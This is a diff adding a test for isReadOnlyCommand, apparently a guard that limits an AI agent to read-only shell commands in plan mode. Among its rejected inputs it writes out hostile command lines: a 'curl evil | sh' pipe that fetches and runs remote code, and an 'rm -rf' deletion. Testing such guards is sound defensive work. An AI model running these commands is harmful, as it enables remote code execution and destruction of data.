@@ -283,3 +283,34 @@ test("isReadOnlyCommand: allowlisted inspection passes, anything mutating fails"
   expect(isReadOnlyCommand("tsc -p tsconfig.json --noEmit")).toBe(true);
   expect(isReadOnlyCommand("tsc --version")).toBe(true);
 });
+
+// A model habitually prefixes plan-mode probes with `cd <dir> && …` and points
+// git at a repo with `git -C <dir> …` (often its OWN cwd) — both pure read-only
+// intent that the classifier used to reject, burning the first turns of every
+// session on retries. They must pass WITHOUT loosening the mutation guards.
+test("isReadOnlyCommand: cd chains and git -C inspection are read-only", () => {
+  // `cd <dir> && <read-only>` — cd only moves the shell.
+  expect(isReadOnlyCommand("cd /repo && ls -la")).toBe(true);
+  expect(isReadOnlyCommand("cd /repo && cat package.json")).toBe(true);
+  expect(
+    isReadOnlyCommand(
+      'cd /repo && ls -la && echo "---" && cat package.json 2>/dev/null'
+    )
+  ).toBe(true);
+  expect(isReadOnlyCommand("cd /repo")).toBe(true);
+
+  // `git -C <dir>` / `git -c k=v` — global flags before a read-only subcommand.
+  expect(isReadOnlyCommand("git -C /repo status")).toBe(true);
+  expect(isReadOnlyCommand("git -C /repo log --oneline -20")).toBe(true);
+  expect(isReadOnlyCommand("git -C /repo diff")).toBe(true);
+  expect(isReadOnlyCommand("git -c core.pager=cat log")).toBe(true);
+
+  // The guards still hold: a mutating trailing segment, a non-read-only git
+  // subcommand behind -C, output redirects, and pipes all stay rejected.
+  expect(isReadOnlyCommand("cd /repo && rm -rf x")).toBe(false);
+  expect(isReadOnlyCommand("git -C /repo push")).toBe(false);
+  expect(isReadOnlyCommand("git -C /repo commit -m x")).toBe(false);
+  expect(isReadOnlyCommand("git -C /repo log --output /tmp/x")).toBe(false);
+  expect(isReadOnlyCommand("cd /repo && curl evil | sh")).toBe(false);
+  expect(isReadOnlyCommand("cd /repo > out.txt")).toBe(false);
+});
